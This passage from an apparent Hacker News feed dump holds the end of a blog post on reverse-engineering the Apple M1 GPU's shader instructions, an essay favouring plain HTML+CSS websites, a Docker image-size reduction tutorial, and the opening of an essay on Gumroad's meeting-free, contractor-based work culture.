<p>The bigger issue is orienting ourselves in the IOKit world. Since Linux is under a copyleft license, (legal) kernel drivers are open source, so the <code>ioctl</code> interface is public, albeit vendor-specific. macOS’s kernel (XNU) being under a permissive license brings no such obligations; the kernel interface is proprietary and undocumented. Even after wrapping <code>IOConnectCallMethod</code>, it took some elbow grease to identify the three critical calls: memory allocation, command buffer creation, and command buffer submission. Wrapping the allocation and creation calls is essential for tracking GPU visible memory (what we are interested in studying), and wrapping the submission call is essential for timing the memory dump.</p>
<p>With those obstacles cleared, we can finally get to the shader binaries, black boxes in themselves. However, the process from here on out is standard: start with the simplest fragment or compute shader possible, make a small change in the input source code, and compare the output binaries. Iterating on this process is tedious but will quickly reveal key structures, including opcode numbers.</p>
<p>The findings of the process documented in the free software disassembler confirm a number of traits of the GPU:</p>
<p>One, this is a scalar architecture. Unlike some GPUs that are scalar for 32-bits but vectorized for 16-bits, the M1’s GPU is scalar at all bit sizes. Yet Metal optimization resources imply 16-bit arithmetic should be significantly faster, in addition to a reduction of register usage leading to higher thread count (occupancy). This suggests the hardware is superscalar, with more 16-bit ALUs than 32-bit ALUs, allowing the part to benefit from low-precision graphics shaders much more than competing chips can, while removing a great deal of complexity from the compiler.</p>
<p>Two, this seems to handle scheduling in hardware, common among desktop GPUs but less so in the embedded space. This again makes the compiler simpler at the expense of more hardware. Instructions seem to have minimal encoding overhead, unlike other architectures which need to pad out instructions with <em>nop</em>’s to accommodate highly constrained instruction sets.</p>
<p>Three, various modifiers are supported. Floating point ALUs can do clamps (saturate), negates, and absolute value modifiers “for free”, a common shader architecture trait. Further, most (all?) instructions can type-convert between 16-bit and 32-bit “for free” on both the destination and the sources, which allows the compiler to be much more aggressive about using 16-bit operations without risking conversion overheads. On the integer side, various bitwise complements and shifts are allowed on certain instructions for free. None of this is unique to Apple’s design, but it’s worth noting all the same.</p>
<p>Finally, not all ALU instructions have the same timing. Instructions like <code>imad</code>, used to multiply two integers and add a third, are avoided in favour of repeated <code>iadd</code> integer addition instructions where possible. This also suggests a superscalar architecture; software-scheduled designs like those I work on for my day job cannot exploit differences in pipeline length, inadvertently slowing down simple instructions to match the speed of complex ones.</p>
<p>From my prior experience working with GPUs, I continue to expect to find some eldritch horror waiting in the instruction set, to balloon compiler complexity. Though the above work currently covers only a small surface area of the instruction set, so far everything seems sound. There are no convoluted optimization tricks, but doing away with the trickery is creating a streamlined, efficient design that does one thing and does it well. Maybe Apple’s hardware engineers discovered it’s hard to beat simplicity.</p>
<p>Alas, a shader tool chain isn’t much use without an open-source userspace driver. Next up: dissecting the command stream!</p>
<p><em>Disclaimer: This work is a hobby project, conducted based on public information. Opinions expressed may not reflect those of my employer.</em></p>
<p><a href="https://rosenzweig.io/">Back to home</a></p>
</div>]]>
            </description>
            <link>https://rosenzweig.io/blog/asahi-gpu-part-1.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25673631</guid>
            <pubDate>Thu, 07 Jan 2021 17:01:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My stack is HTML+CSS]]>
            </title>
            <description>
<![CDATA[
Score 219 | Comments 175 (<a href="https://news.ycombinator.com/item?id=25673495">thread link</a>) | @zdw
<br/>
January 7, 2021 | https://blog.steren.fr/2020/my-stack-will-outlive-yours/ | <a href="https://web.archive.org/web/*/https://blog.steren.fr/2020/my-stack-will-outlive-yours/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
  <article>
	<header>
		
		<time date="2020-12-22">December 2020</time>
	</header>

		<p>
		My stack requires no maintenance, has perfect Lighthouse scores, will never have any security vulnerability, is based on open standards, is portable, has an instant dev loop, has no build step and… will outlive any other stack.
		</p>
		<p>
		It’s not LAMP, Wordpress, Rails, MEAN, Jamstack... I don’t do CSR (Client-side rendering), SSR (Server Side Rendering), SSG (Static Site Generation)...
		</p>
		<p>
		My stack is <b>HTML+CSS</b>.
		</p>
		<p>
		And because my sources are in git, pushed to GitHub, <a href="https://pages.github.com/">GitHub Pages</a> is my host.
		</p>
		<p>
		Of course, I’m being a bit provocative here. I should rather say that, for some specific use cases, I concluded that to get top performances and to guatantee long term support, HTML+CSS was the best choice, instead on relying on technologies currently more popular. Because I’m done rewriting my site every couple of years.
		</p>

		<h3>Why HTML+CSS?</h3>
		<p>
		It all started with <a href="https://labs.steren.fr/">a blog</a>, that I was hosting on Wordpress.com (which is "Wordpress-as-a-Service", because the last thing I want to do is administer a Wordpress installation on my own server). I <strong>paid</strong> Wordpress.com to do one job: host my blog. And one day I looked at its sources and Lighthouse scores:
		</p>
		<figure>
			<img src="https://blog.steren.fr/2020/my-stack-will-outlive-yours/wordpress-sources.png" alt="Sources of my Wordpress.com blog, showing a lot of inlined unreadable scripts">
			<figcaption>Sources of my Wordpress.com blog, what is all this?</figcaption>
		</figure>
		<figure>
			<img src="https://blog.steren.fr/2020/my-stack-will-outlive-yours/wordpress-lighthouse.png" alt="Lighthouse scores of my Wordpress.com blog, showing 19/100 for Performance">
			<figcaption>Lighthouse score of my blog hosted on Wordpress.com</figcaption>
		</figure>
		<p>
		What have we done?
		</p>
		<p>
		Sure, these are the problems of one specific blogging platform. I’m pretty sure others are better, at least in terms of performance. But isn’t there something fundamentally wrong if displaying a short text with images takes seconds, loads countless render-blocking scripts, and has unreadable sources?
		</p>
		<p>
		My requirements were:
		</p>
		<ol>
			<li>performance</li>
			<li>simplicity</li>
			<li>long long term support</li>
		</ol>
		<p>
		It was time to say goodbye to Wordpress. I didn’t need 99% of its features anyway. Other blogging platforms didn’t meet expectations either (I seriously have no idea why so many people publish on Medium… behind a login wall). I looked at static site generators like Jekyll, Hugo, 11ty, but all of these require tooling installed, have a build step and will ultimately need some updates or be abandonned by their maintainer. What if we also get rid of these?
		</p>
		<p>
		The best tool is no tool, the best build step is no build step, the best update is no update. HTML gives us all that, and more.
		</p>

		<figure>
			<img src="https://blog.steren.fr/2020/my-stack-will-outlive-yours/lighthouse-score-pure-html-css.svg" alt="Lighthouse score of 100">
			<figcaption>Lighthouse score of this page</figcaption>
		</figure>

		<h3>What is the HTML+CSS stack good for?</h3>
		<p>
		Let’s first differentiate between what I call a web <em>page</em> and a web <em>app</em>: The goal of a web <em>page</em> is to serve content, on the other hand, the goal of a web <em>app</em> is to enable the user to perform interactive tasks. Of course, there are in-betweens, often in the form of content that might need customization depending on the logged in user and content that might allow some interactions.
		</p>
		<p>
		HTML+CSS fits the web <em>page</em> use case. Wow, what a revelation! It might seem obvious, but it seems we’ve all forgotten this these days. HTML+CSS does not fit the web <em>app </em>use case, or any in between.
		</p>
		<p>
		We said a web <em>page</em> serves content, but let’s dive into more concrete use cases:
		</p>
		<ul>
			<li>Product / Company / Business landing page and marketing sites</li>
			<li>Personal portfolio / bio</li>
			<li>Blog</li>
			<li>Documentation</li>
		</ul>

		<h3>How to develop for HTML+CSS?</h3>
		<p>
		Authoring a pure HTML+CSS site can be done in any text editor, in any environment (any desktop OS, any smartphone, or even directly using GitHub’s single file editor) and previewed by simply opening the file in any browser.
		</p>
		<p>
		Keep the HTML of every page minimal and semantic. First, because there is no need for countless of &lt;div&gt;, but then because it makes sources more readable and easier to edit. See for example the <a href="https://github.com/steren/blog/blob/master/2020/my-stack-will-outlive-yours/index.html">HTML sources of this page</a>: a total of 150 lines, 100 lines are for the content, the rest is metadata and page structure, nothing extra. 
		</p>
		<p>
		For consistency, all pages that need to share the same style can point to the same CSS file. This avoids  duplication when it comes to styling (but note that loading this file creates an extra HTTP request, which could be avoided if style was inlined).
		</p>
		<p>
		When not cluttered with unnecessary scripts, divs or classes, I have no issue writing HTML directly. Yes, the paragraph tags are a bit annoying and distracting, but proper indentation and syntax highlighting mitigate this.
		<br>
		Sometimes, for drafting long blog articles, I’m working in Google Docs, and when I’m happy, export the content to clean HTML using an add-on. Google Docs is awesome for collaboration, with powerful suggestions and commenting system. That’s ideal for the “draft” phase. 
		<br>
		Because all content is in git, final review and approval can be done via GitHub pull requests.
		</p>
		<p>
		When I publish a new page, I need to link to it manually from the index page. I’m OK with that. It’s done in one line. It also allows me to have more control over when I want the page to be “published”.
		</p>
		<p>
		I don't need to pay for custom themes, I have complete freedom in the style and layout of my site.
		I can embed anything I want without being restricted by the choice of the hosting platform: SVG images, 3D models, interactive JS experiences. 
		</p>
		<p>
		Creating a new page requires to clone an existing one.
		So... if I don’t use any templating system, how do I update my header, footer or nav? Well, simply by using the ”Replace in files” feature of any good text editor. They don’t need frequent updates anyway. The benefits of using a templating system is not worth the cost of introducing the tooling it requires.
		</p>
		
		<h3>In conclusion</h3>
		<p>
		You don’t need  Wordpress, or Hugo to put a blog online, or Angular, React or Next.js to put a web page online. Raw HTML and CSS do the job.
		</p>
		<p>
		That being said, you’ll need to pick up some tooling or framework if you want to build a web app or add more interactivity or customization to your web pages. And for that, I’m very glad to see that frameworks now seem to be prioritizing performance, notably by prioritizing serving the content first and leveraging caching whenever possible. The era of “download 5MB of JS first and then download content from a REST API” seems to be over for content web pages. (I personally think it’s still OK to do so for web apps, as the user’s intent and expectations are different).
		</p>
		<p>
		Is the “HTML+CSS only” approach a bit extreme? A bit, it’s basically saying “all software is terrible, how can I minimize my dependencies on software”. Web standards are a model of backward compatibility. I’m pretty confident that my web pages written in raw HTML+CSS will have no issue being accessed and authored 10 years from now, without me having to do anything.
		</p>  
	</article>
</div></div>]]>
            </description>
            <link>https://blog.steren.fr/2020/my-stack-will-outlive-yours/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25673495</guid>
            <pubDate>Thu, 07 Jan 2021 16:54:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Reducing Docker Image Size Particularly for Kubernetes Environments]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25673388">thread link</a>) | @sequoia
<br/>
January 7, 2021 | https://sequoia.makes.software/reducing-docker-image-size-particularly-for-kubernetes-environments/ | <a href="https://web.archive.org/web/*/https://sequoia.makes.software/reducing-docker-image-size-particularly-for-kubernetes-environments/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="content"><h2 id="one-day-on-slack-">
    <a href="#one-day-on-slack-">
      
    </a>
    One Day on Slack...</h2><blockquote>
<p>1.3gb for a web app?! The size of your Docker image is getting out of control!</p>
</blockquote>
<p>Uh-oh... The infrastructure team is <em>calling you out</em> for your Docker image size! Larger images means...</p>
<ul>
<li><a href="https://kubernetes.io/docs/concepts/workloads/controllers/garbage-collection/">Garbage collection of stale images &amp; containers</a> takes longer*</li>
<li>Node storage runs out faster*</li>
<li>It takes longer to build the image</li>
<li>It takes longer to send the image over the wire</li>
</ul>
<p>All of these are small problems but <strong>they add up!</strong> So your image is too big–don't panic! Following a few simple steps, you can cut your Docker image down to size in next to no time.</p>
<p>*<em>this post assumes you are running Docker images in Kubernetes.</em></p>
<h2 id="contents-of-this-post">
    <a href="#contents-of-this-post">
      
    </a>
    Contents of This Post</h2><ol>
<li><a href="#analyzing-your-image">Analyzing your image to see why it's big</a></li>
<li><a href="#chopping-your-image-in-twain">Chopping your image in two</a></li>
<li><a href="#cleaning-up-image-contents">Cleaning up image contents</a></li>
</ol>
<h2 id="analyzing-your-image">
    <a href="#analyzing-your-image">
      
    </a>
    Analyzing Your Image</h2><p>How big is your image? Assuming you've run <code>docker build</code> to build your image locally, this is easy to check with <code>docker images</code>:</p>
<pre><code>➜ docker images
REPOSITORY                           TAG      IMAGE ID      CREATED       SIZE
gcr.io/ns-1/toodle-app               d82c28d  e4f0fd00de6d  4 months ago  1.32GB
gcr.io/ns-2/go-af                    v0.12.1  d665db43eb95  4 months ago  911MB
</code></pre>
<p>Our <code>toodle-app</code> image is <code>1.32 GB</code>. But why is it so big? To figure that out, we'll use a handy tool called <a href="https://github.com/wagoodman/dive">dive</a> to analyze the image layer by layer.</p>
<pre><code>➜ dive gcr.io/ns-1/toodle-app:d82c28d
Image Source: docker://gcr.io/ns-1/toodle-app:d82c28d
Fetching image... (this can take a while for large images)
</code></pre>
<p>When it completes it will show a view like this:</p>
<p><img src="https://sequoia.makes.software/img/docker-dive-1.png" alt="dive command output"></p>
<p>There's a lot going on here!</p>
<ul>
<li>The top-left panel shows you <strong>layers</strong>, each of which corresponds to a Dockerfile command. (If the command if it's truncated, find the <em>full</em> command below in the "Layer Details" section.)</li>
<li>The right column shows the filesystem tree for the <strong>currently selected layer</strong>–more on this later</li>
<li>The bottom left is <strong>Image Details</strong> and does not change as you navigate through the layers</li>
</ul>
<p>Use the arrow keys to navigate up and down in the currently selected pane. Use <code>tab</code> to switch from the Layers pane to Current Layer Contents and back. Here I've pressed the down arrow several times to get to the 309 MB <code>RUN make build/bin/server</code> layer, then used <code>tab</code> to switch focus to the Current Layer Contents panel:</p>
<p><img src="https://sequoia.makes.software/img/docker-dive-2.png" alt="dive command output: &quot;RUN make build/bin/server&quot; layer"></p>
<p>By default, the Current Layer Contents shows you a full tree of the filesystem up to and including the selected layer. What's typically more useful when analyzing your image size by layer is to see what files were added by <em>that</em> layer. Use <code>ctrl+u</code> (see "^U Unmodified" in the bottom right of the screenshot) to toggle that option <em>off</em>, which <strong>hides files unmodified by the current layer</strong>. This leaves visible only files that were Added, Removed, or Modified by <em>this</em> layer:</p>
<p><img src="https://sequoia.makes.software/img/docker-dive-3.png" alt="dive command output: &quot;RUN make build/bin/server&quot; layer with unmodified files hidden"></p>
<p>Hello, what's this–this layer (which runs <code>go build</code> to build the actual toodle-app binary) add 309MB, but 237MB of that is <a href="https://golang.org/ref/mod#module-cache">go mod cache</a>, which <strong>we do not need after the binary has been built!</strong></p>
<p>Now we know why this layer is larger than it should be and we can see about cleaning it up (we'll do this <a href="#remove-build-tools-and-assets-after-the-build-completes">below</a>). Repeat the process for other large layers, or just poke around and see what each layer is adding or modifying.</p>
<p>Now that we know how to figure out <em>why</em> it's big, let's look at some strategies to cut down an image's size...</p>
<h2 id="chopping-your-image-in-twain">
    <a href="#chopping-your-image-in-twain">
      
    </a>
    Chopping Your Image in Twain</h2><p>When we build a project inside a docker image, each of the things we pull or copy into that image falls into one of two categories:</p>
<ol>
<li>Stuff we need to <strong>build</strong> the application</li>
<li>Stuff we need to <strong>run</strong> the application</li>
</ol>
<p>Some of the things we add to our toodle-app image, above:</p>
<ul>
<li><code>make</code>: needed to <strong>build</strong> the application</li>
<li><code>gcc</code>: needed to <strong>build</strong> the application</li>
<li>go modules: needed to <strong>build</strong> the application</li>
<li><code>nginx</code>: needed to <strong>run</strong> the application</li>
<li><code>./build/client/strings</code>: needed to <strong>run</strong> the application</li>
<li>the <code>build/bin/server</code> binary we create: needed to <strong>run</strong> the application</li>
</ul>
<p>The stuff we need only at build time (<code>make</code>, <code>gcc</code>, etc.) <strong>does not need to be shipped as part of the image</strong> because <strong>it is not needed at runtime</strong>. We could uninstall <code>make</code> <code>gcc</code> etc. after running the build, but there is an even cleaner way: <strong>create one image just for building the application and one image just for running the application</strong>.</p>
<p>This has become a common pattern, and there are two ways to do this:</p>
<h3 id="two-separate-docker-files-em-old-approach-should-not-be-needed-anymore-em-">
    <a href="#two-separate-docker-files-em-old-approach-should-not-be-needed-anymore-em-">
      
    </a>
    Two Separate Docker Files ❌ <em>(old approach, should not be needed anymore)</em></h3><p>With this approach you have one "builder" image and a separate "runtime" image. From a high level:</p>
<ol>
<li>A <code>Dockerfile.builder</code> Dockerfile defines your "builder" image. This builds an image based on....</li>
<li>A <em>separate</em> runtime <code>Dockerfile</code> contains <em>only</em> runtime dependencies</li>
</ol>
<p>Your CI step (e.g. on Google Cloud Build) loads the "Builder" image and <em>runs docker inside that image</em> to produce your runtime image.</p>
<h3 id="multi-stage-builds-em-current-approach-use-this-one-em-em-em-">
    <a href="#multi-stage-builds-em-current-approach-use-this-one-em-em-em-">
      
    </a>
    Multi-Stage Builds ✅ <em>(current approach: use this one</em> 😄<em>)</em></h3><p><a href="https://docs.docker.com/develop/develop-images/multistage-build/">Multi-Stage Builds</a> vastly simplify this process! A multi-stage docker file has multiple <code>FROM</code> commands, the first one for the "builder" and the second one for the "runtime." Basically you install all the build dependencies in your builder, run your build, then in the runtime build you <code>COPY</code> the build artifact into your runtime image which you can then deploy.</p>
<pre><code>

<span>FROM</span> golang:<span>1.7</span>.<span>3</span> AS sequoiasbuilder
<span>WORKDIR</span><span> /tmp/foo
</span><span>COPY</span><span> src/main.go . 
</span>

go build -o my-application ./main.go



<span>FROM</span> alpine:latest 
<span>WORKDIR</span><span> /root/
</span>

<span>COPY</span><span> --from=sequoiasbuilder /tmp/foo/my-application .
</span><span>CMD</span><span> [<span>"./my-application"</span>]</span>
</code></pre>
<p>Now only those things necessary for runtime will be shipped to kubernetes, and the go binary (and all the go modules that <code>go build</code> pulled in) etc. are discarded! Read <a href="https://docs.docker.com/develop/develop-images/multistage-build/">this short article</a> for more.</p>
<h3 id="which-one-to-use-a-note-on-layer-caching">
    <a href="#which-one-to-use-a-note-on-layer-caching">
      
    </a>
    Which one to use? A note on layer caching</h3><p>The main reason to use the "multiple dockerfiles" approach is because the underlying "builder" image can be built once and reused across many builds. But Docker image layers by default, so why would you need this? You would need this if <strong>your (<abbr title="Continuous Integration">CI</abbr>) build environment is discarding Docker image layers after each build</strong>, as Google Cloud Platform does by default. Discard docker images after each build = build from scratch each time.</p>
<p>There is a simple fix for this, however: the Kaniko builder allows layers to be <strong>stored, cached, and reused.</strong></p>
<p>❗️ On <abbr title="Google Cloud Build">GCB</abbr>, using Kaniko is recommended for <strong>both</strong> builder <strong>and</strong> multi-stage patterns. <a href="https://cloud.google.com/cloud-build/docs/kaniko-cache">Read more.</a></p>
<h2 id="cleaning-up-image-contents">
    <a href="#cleaning-up-image-contents">
      
    </a>
    Cleaning Up Image Contents</h2><p>Assuming you don't go the Multi-Stage route (above), or even if you did, you may be able to reduce your image size by <strong>removing stuff you don't actually need</strong>.</p>
<h3 id="ensure-you-em-actually-need-em-everything-you-39-ve-added">
    <a href="#ensure-you-em-actually-need-em-everything-you-39-ve-added">
      
    </a>
    Ensure you <em>actually need</em> everything you've added</h3><p>Did you start building your dockerfile by copying an existing one? If so, perhaps you have a command like this near the top</p>
<pre><code><span>RUN</span><span> apk add --no-cache make git curl bash nginx pkgconfig zeromq-dev \
     gcc musl-dev autoconf automake build-base libtool python</span>
</code></pre>
<p>Check that you <em>actually need</em> all these things! Some may be cruft from another project, or the dependency may have been replaced. <strong>This is especially important if you're building off a shared "base" image file.</strong> When using a shared base image, it's very likely that there's stuff in there you don't need. Easy money!</p>
<h3 id="remove-build-tools-and-assets-after-the-build-completes">
    <a href="#remove-build-tools-and-assets-after-the-build-completes">
      
    </a>
    Remove build tools and assets after the build completes</h3><p>As we saw above using <code>dive</code>, the toodle-app <code>go build</code> was downloading <strong>and caching</strong> 237 MB of go modules, which were needed during the build but not after:</p>
<pre><code>│ Current Layer Contents ├──────────────────────────────────────
Permission     UID:GID       Size  Filetree
drwxr-xr-x         0:0      72 MB  ├── mosmos
drwxr-xr-x         0:0      72 MB  │   └── toodle-app
drwxr-xr-x         0:0      72 MB  │       └── build
drwxr-xr-x         0:0      72 MB  │           └── bin
-rwxr-xr-x         0:0      72 MB  │               └── server
drwx------         0:0     237 MB  └── root
drwxr-xr-x         0:0     237 MB      └── .cache
drwxr-xr-x         0:0     237 MB          └── go-build
</code></pre>
<p>The following change fixed this problem in toodle-app:</p>
<pre><code><span>- RUN make build/bin/server</span>
<span>+ RUN make build/bin/server &amp;&amp; go clean -cache</span>
</code></pre>
<p>Other examples of this are removing <code>gcc</code>/<code>make</code>/<code>webpack</code> or removing <code>dev-dependencies</code> for a JavaScript project.</p>
<h3 id="remove-static-assets-when-possible">
    <a href="#remove-static-assets-when-possible">
      
    </a>
    Remove static assets when possible</h3><p>You may have static assets in your image that rarely change and are not actually needed <em>within</em> the application. For example, the toodle-app image contains various reports and media assets:</p>
<pre><code>-rw-r--r--         0:0      12 MB                  ├── MarketReport.pdf
-rw-r--r--         0:0      12 MB                  ├── EconReport.pdf
-rw-r--r--         0:0      34 MB                  ├── Toodle-MediaKit.zip
drwxr-xr-x         0:0     4.3 MB                  ├── press-releases
</code></pre>
<p>It's not huge, but this is 62MB that gets pulled by the Kubernetes controller for <em>every</em> deployment and copied into <em>every</em> container (the image upon which this post is based was running on 268 containers at the time of writing), all of which need garbage collection... it adds up!!</p>
<h2 id="conclusion">
    <a href="#conclusion">
      
    </a>
    Conclusion</h2><p>Making your images smaller is easy, it improves infrastructure performance and it saves money. What's not to like? If you've got more tips for shaving bits off your image size, drop me a line &amp; I'll add them below!</p>
<em> 
📝 Comments? Please email them to my <tt>protonmail.com</tt> address, username <tt>sequoiam</tt></em></section></div>]]>
            </description>
            <link>https://sequoia.makes.software/reducing-docker-image-size-particularly-for-kubernetes-environments/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25673388</guid>
            <pubDate>Thu, 07 Jan 2021 16:47:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[No meetings, no deadlines, no full-time employees]]>
            </title>
            <description>
<![CDATA[
Score 1278 | Comments 494 (<a href="https://news.ycombinator.com/item?id=25673275">thread link</a>) | @sahillavingia
<br/>
January 7, 2021 | https://sahillavingia.com/work | <a href="https://web.archive.org/web/*/https://sahillavingia.com/work">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><label>Jan 7, 2021 • 10 min read</label><h2>No Meetings, No Deadlines, No Full-Time Employees</h2><p>I started Gumroad in 2011. In 2015, we reached a peak of 23 full-time employees. In 2016, after <a href="https://sahillavingia.com/reflecting">failing</a> to raise more money, I ended up back where I began: a one-person company.</p><p>Today, when I’m asked how many people work at Gumroad, I respond with “ten or so.” That’s how I convert the number of people we have into what others expect. But the truth is more complicated:</p><p>If we include everyone who works on Gumroad, it’s 25.</p><p>If we include full-time employees, it’s none. Not even me.</p><p>We have no meetings, and no deadlines either.</p><p>And it’s working: our creators earn over $175 million a year, and we generate $11 million in annualized revenue, growing 85% year-over-year.</p><p><img src="https://sahillavingia.com/2020-earnings.png"></p><p>That said, I don’t expect anyone to copy our way of working wholesale. We got here on accident, not some grand plan.</p><p>However, I do think there are pieces of our story and the way we work that could benefit other companies, their people, and–most importantly–their customers.</p><h2>Freedom at all costs</h2><p>After the layoffs in 2015, even though the team shrunk, Gumroad itself continued to grow.</p><p><img src="https://sahillavingia.com/2018-earnings.png"></p><p>But hiring people full-time and leasing a new office in San Francisco to work out of was untenable. Instead, I found an Indian firm called <a href="https://bigbinary.com/">BigBinary</a> and hired a few engineers as contractors.</p><p>These contractors saved the company. They fixed bugs and maintained the site while I answered support tickets, designed features, and wrote about new initatives.</p><p>Eventually, I hired back the same customer support person we had from before the layoffs, this time via an hourly contracting agreement too.</p><p>Meanwhile, I <a href="https://sahillavingia.com/bubble">moved to Utah</a> and attempted to become a full-time creator.</p><p>While Gumroad was no longer on track to become a billion-dollar company, I acquired a new asset: time. I used that time to take classes on writing and painting.</p><p>Because I was burned out and didn’t want to think about working any more than I needed to, I instituted a no-meeting, no-deadline culture.</p><p>For me, it was no longer about growth at all costs, but “freedom at all costs.”</p><p>This way, Gumroad stayed profitable, I could take a much-needed break to explore my hobbies, and the product continued to improve over time.</p><p><img src="https://sahillavingia.com/operating.png"></p><h2>How we work</h2><p>Today, working at Gumroad resembles working on an open source project like Rails. Except it’s neither open source, nor unpaid.</p><p>Instead of having meetings, people “talk” to each other via GitHub, Notion, and (occasionally) Slack, expecting responses within 24 hours. Because there are no standups or “syncs” and some projects can involve expensive feedback loops to collaborate, working this way requires clear and thoughtful communication.</p><p>Everyone writes well, and writes <em>a lot</em>.</p><p>There are no deadlines either. We ship incrementally, and launch things whenever the stuff in development is better than what’s currently in production. The occasional exception does exist, such as a tax deadline, but as a rule, I try not to tell anyone what to do or how fast to do it. When someone new joins the company, they do what everyone else does: go into our Notion queue, pick a task, and get to work, asking for clarification when needed.</p><p>Instead of setting quarterly goals or using OKRs, we move towards a single north star: maximizing how much money creators earn. It’s simple and measurable, allowing anyone in the company to do the math on how much a feature or bug-fix might be worth.</p><p>But we don’t prioritize ruthlessly.</p><p>People can work on what’s fun or rely on their intuition, because as long as we remain profitable and keep shipping, we tend to get to the important stuff eventually. Our <a href="https://www.notion.so/gumroad/Roadmap-ce2ad07c483046e7941227ad7810730d">public roadmap</a> helps Gumroad's creators hold us accountable.</p><p>We ship big things this way too.</p><p>In November 2020, we shipped <a href="https://gumroad.com/gumroad/p/introducing-gumroad-memberships">Gumroad Memberships</a>, a year in the works and now used by hundreds of creators to earn over $1,500,000 per month.</p><p>This is a screenshot from our roadmap to show what it looks like in practice:</p><p><img src="https://sahillavingia.com/memberships-roadmap.png"></p><p>For more, I recorded <a href="https://www.youtube.com/watch?v=2PcIC1DKBU0">an hour-long video</a> about how we ship something as large as Gumroad Memberships.</p><p>Gumroad engineer Helen Hood, who shipped Memberships, says, “it’s one of the biggest product launches of my career, and we shipped it without a single meeting or video call. I've worked at your typical startup, with an open floor plan, lots of whiteboards, standups and sprint planning, beers after work. I’ve also worked on a remote team with little communication and engineers largely siloed on their own projects. The way we work at Gumroad is ideal for me. It lets me maximize my productive hours, and clock out when I've hit my limit.”</p><p>Those are the broad strokes, but we’ve published more specific documentation about the way we work:</p><ul><li><a href="https://www.notion.so/gumroad/How-do-we-decide-what-to-work-on-f2064b8ab16c4cbcac1077e16c8cf33b">How do we decide what to work on?</a><p>“At the end of the day there's a lot of emotion that goes into Gumroad, that's not dissimilar from an art project. We sometimes pick what's fun and feels good to work on! We love listening to creators! We don't do tons of data analysis to decide what's worth working on.”</p></li><li><a href="https://www.notion.so/gumroad/How-do-we-communicate-06f2032bfdae4552a38149c99c68e3df">How do we communicate?</a><p>“Turn off all notifications from your phone!”</p></li><li><a href="https://www.notion.so/gumroad/What-does-working-at-Gumroad-feel-like-7d9fd1c9548245a58afe5569d76a7960">What does working at Gumroad feel like?</a><p>“We ship incrementally, iteratively, and have one massive tentpole launch a year. Every month we see how much creators got paid, then we move on. The journey is the fun part, we're not waiting to arrive at some destination.”</p></li><li><a href="https://www.notion.so/gumroad/What-s-not-so-good-at-Gumroad-847e3c285b1f45ab955ebacf52867900">What’s not so good at Gumroad?</a><p>“There's not a lot of room for growth. We're staying profitable, and not planning to double the team every year. While there will likely be a few leadership roles, there aren't plenty of them and they aren't built into the career path of working at Gumroad.”</p></li></ul><p>Gumroad’s Chris Maximin says, “this way to work is responsible for the highest level of productivity I've ever experienced. The ability to focus on actual work creates a virtuous circle benefiting both the company and the workers: 1) the company does not have to pay expensive engineers to sit around in endless, useless meetings, and 2) the engineers get to do more and learn more, which benefits them in the long term.”</p><p>This isn’t just for engineers.</p><p>Justin Mikolay, a writer at Gumroad, ships each of our <a href="https://gumroad.com/l/BCMDz">Creator Spotlights</a> this way, even though each one requires at least three people–plus the creator.</p><p><em>Everything</em> is handled this way: support, risk, content, growth, product prioritization, board decks, design feedback, and more.</p><h2>Minimum viable culture</h2><p>This way of working isn’t for everyone.</p><p>There are no retreats planned, and no social channels in Slack. There are limited opportunities for growth. And we can’t compete with the comp packages that big tech companies can provide.</p><p>But we can compete–and win–on flexibility.</p><p><a href="https://twitter.com/sidyadav">Sid Yadav</a>, former VP of Product at Teachable, joined Gumroad in 2018.</p><p>In his words, “most entrepreneurs have two options: work a full-time job and hustle nights/weekends, or leave your job and risk everything to start the company. Gumroad provided a third way: I could contract 20-35 hours a week, and for a couple days a week, incubate ideas and work on my next thing.”</p><p>In 2020, Sid left Gumroad to start his own creator economy company, <a href="https://circle.so/">Circle</a>, together with former Gumroad coworker <a href="https://community.circle.so/u/45ef416b">Rudy Santino</a>:</p><blockquote><p lang="en" dir="ltr">I’m starting a new company: <a href="https://t.co/BW40WmGBlF">https://t.co/BW40WmGBlF</a>! I’ll be sharing more about it in the coming weeks, but today I wanted to show gratitude to the life situation that made this possible: contracting for a flexible remote startup — <a href="https://twitter.com/gumroad?ref_src=twsrc%5Etfw">@gumroad</a>. It wouldn’t have happened without it.</p>— Sid Yadav (@sidyadav) <a href="https://twitter.com/sidyadav/status/1216761573479473152?ref_src=twsrc%5Etfw">January 13, 2020</a></blockquote> <p>Working on Gumroad isn't a majority of anyone's identity.</p><p>People work at Gumroad as little as they need to sustain the other parts of their lives they prefer to spend their time and energy on: a creative side-hustle, their family, or anything else.</p><p>Gumroad engineer Nathan Chan says, “I produce more value for my time than at any other company in my career, and I’m able to fully participate in parenting and watching my kiddo grow up.”</p><p>That includes me.</p><p>From 2011 to 2016, building Gumroad was my singular focus in life. But today, it is just a part of my life, like a hobby might be. For example, I paint for fun, and every once in a while, I sell a painting.</p><h2>A company of creators</h2><p>One day, out of the blue, I received an email from <a href="https://twitter.com/dvassallo">Daniel Vassallo</a>. I knew Daniel; he was a creator who had made over $250,000 on Gumroad in less than a year.</p><p>He was already using the product–so he understood what problems Gumroad ought to solve next–and he had some ideas for how he could help out:</p><blockquote>I love Gumroad (and I’m living off it!), I enjoy product scoping and strategy, and I think I can take over your PM tasks. I would only be able to dedicate around 2hrs/day on average, but I’d be available daily. Don’t know if this is the type of commitment you had in mind, but I figured if there’s a place where this arrangement can work, it’s Gumroad :)</blockquote><p>It was a perfect fit. Daniel became our new Head of Product.</p><p>It can be a great deal for Gumroad too. Before Daniel quit his job at Amazon, he was making over $400,000 a year. We pay him $120,000 a year.</p><p>How? He works ten hours a week for us. In his words:</p><blockquote><p lang="en" dir="ltr">Almost nobody is seeing this trend as an opportunity to work less, rather than to earn more. <a href="https://t.co/U9YBqp1ebn">https://t.co/U9YBqp1ebn</a></p>— Daniel Vassallo (@dvassallo) <a 